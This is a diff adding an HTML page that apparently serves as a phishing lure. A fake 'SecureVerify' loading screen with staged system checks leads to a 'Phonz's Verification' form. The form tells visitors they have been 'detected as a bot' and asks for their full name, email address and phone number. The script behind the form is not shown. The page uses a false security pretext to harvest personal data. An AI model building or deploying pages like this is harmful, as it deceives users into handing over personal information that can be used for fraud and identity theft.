@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Debug Test</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="loading-screen" id="loading-screen">
+        <div class="loading-container">
+            <div class="logo-container">
+                <div class="logo">
+                    <div class="logo-icon">🔒</div>
+                    <div class="logo-text">SecureVerify</div>
+                </div>
+            </div>
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar">
+                    <div class="progress-fill" id="progress-fill"></div>
+                </div>
+                <div class="progress-text" id="progress-text">Initializing system...</div>
+            </div>
+            
+            <div class="status-container">
+                <div class="status-item" id="status-1">
+                    <div class="status-icon">⏳</div>
+                    <div class="status-text">Checking system requirements</div>
+                </div>
+                <div class="status-item" id="status-2">
+                    <div class="status-icon">⏳</div>
+                    <div class="status-text">Verifying device compatibility</div>
+                </div>
+                <div class="status-item" id="status-3">
+                    <div class="status-icon">⏳</div>
+                    <div class="status-text">Preparing authentication</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="verification-screen" id="verification-screen" style="display: none;">
+        <div class="verification-container">
+            <div class="verification-header">
+                <div class="verification-icon">📋</div>
+                <h2>Phonz's Verification</h2>
+                <p>Please Complete The Form Below You Have Been Detected As A Bot</p>
+            </div>
+            
+            <div class="info-form" id="info-form">
+                <div class="input-group">
+                    <label for="user-name">Full Name</label>
+                    <input type="text" id="user-name" placeholder="Enter your full name" class="info-input" autocomplete="name">
+                    <div class="input-error" id="name-error"></div>
+                </div>
+                
+                <div class="input-group">
+                    <label for="user-email">Email Address</label>
+                    <input type="email" id="user-email" placeholder="Enter your email address" class="info-input" autocomplete="email">
+                    <div class="input-error" id="email-error"></div>
+                </div>
+                
+                <div class="input-group">
+                    <label for="user-phone">Phone Number</label>
+                    <input type="tel" id="user-phone" placeholder="Enter your phone number" class="info-input" inputmode="tel" autocomplete="tel">
+                    <div class="input-error" id="phone-error"></div>
+                </div>
+                
+                <button id="submit-info" class="verify-button">Submit Information</button>
+            </div>
+        </div>
+    </div>
+    
+    <script src="debug-script.js"></script>
+</body>
+</html>
